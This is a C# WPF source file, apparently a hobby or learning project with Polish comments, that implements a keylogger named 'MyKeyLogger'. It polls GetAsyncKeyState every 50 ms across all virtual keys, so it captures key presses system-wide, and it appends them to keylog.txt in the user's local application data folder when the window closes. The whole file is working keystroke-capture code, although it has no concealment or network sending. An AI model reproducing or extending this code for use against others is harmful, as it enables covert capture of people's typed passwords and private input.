using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows;
using System.Windows.Threading;

namespace MyKeyLogger;

public partial class MainWindow : Window
{
	private const string AppDir = "MyKeyLogger";
	private const string FileName = "keylog.txt";

	// stare podejście używające DllImport
	//[DllImport("user32.dll")]
	//private static extern short GetAsyncKeyState(int vKey);

	// nowe podejście używające LibraryImport, EntryPoint -> nazwa metody wywoływanej z DLL
	[LibraryImport("user32.dll", EntryPoint = "GetAsyncKeyState")]
	private static partial short GetAsyncKeyState(int vKey);

	// przechowuje informacje o tym, czy dany klawisz był wcześniej wciśnięty.
	private readonly Dictionary<VirtualKey, bool> _keyStates = [];

	private readonly VirtualKey[] _keysToCheck = Enum.GetValues<VirtualKey>();
	private readonly DispatcherTimer _timerKeyClick = new();
	private readonly StringBuilder _sb = new();
	private static readonly string _directoryPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), AppDir);
	private static readonly string _logFilePath = Path.Combine(_directoryPath, FileName);

	public MainWindow()
	{
		InitializeComponent();
		_sb.Append($"{Environment.NewLine}{DateTime.Now}{Environment.NewLine}");
		_timerKeyClick.Interval = TimeSpan.FromMilliseconds(50);
		_timerKeyClick.Tick += TimerKeyClick_Tick;
		_timerKeyClick.Start();
	}

	private void TimerKeyClick_Tick(object? sender, EventArgs e)
	{
		foreach (var key in _keysToCheck)
		{
			bool isPressed = (GetAsyncKeyState((int)key) & 0x8000) != 0;

			// logowanie naciśnięcia klawisza następuje tylko wtedy, gdy klawisz właśnie został wciśnięty (czyli wcześniej nie był).
			if (isPressed && (!_keyStates.ContainsKey(key) || !_keyStates[key]))
			{
				_sb.Append(key.ToString());
				_sb.Append(' ');
				_keyStates[key] = true;
			}
			// gdy klawisz zostanie puszczony, jego stan w słowniku jest resetowany.
			else if (!isPressed)
			{
				_keyStates[key] = false;
			}
		}

		#region testy
		//bool shiftPressed = (GetAsyncKeyState(VK_LSHIFT) & 0x8000) != 0;
		//bool f1Pressed = (GetAsyncKeyState(VK_F1) & 0x8000) != 0;

		//if (shiftPressed && f1Pressed)
		//{
		//	string message = $"[{DateTime.Now}] SHIFT + F1 wciśnięte";
		//	LogToFile(message);
		//}

		//if ((GetAsyncKeyState((int)VirtualKey.F1) & 0x8000) != 0)
		//{
		//	LogToFile(VirtualKey.F1.ToString());
		//}
		//else if ((GetAsyncKeyState((int)VirtualKey.F2) & 0x8000) != 0)
		//{
		//	LogToFile(VirtualKey.F2.ToString());
		//}
		//if ((GetAsyncKeyState((int)VirtualKey.F3) & 0x8000) != 0)
		//{
		//	LogToFile(VirtualKey.F3.ToString());
		//}
		//else if ((GetAsyncKeyState((int)VirtualKey.F4) & 0x8000) != 0)
		//{
		//	LogToFile(VirtualKey.F4.ToString());
		//}
		#endregion testy
	}

	private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
		=> LogToFile(_sb.ToString());

	private void LogToFile(string text)
	{
		if (!Directory.Exists(_directoryPath))
		{
			Directory.CreateDirectory(_directoryPath);
		}
		File.AppendAllText(_logFilePath, text);
	}
}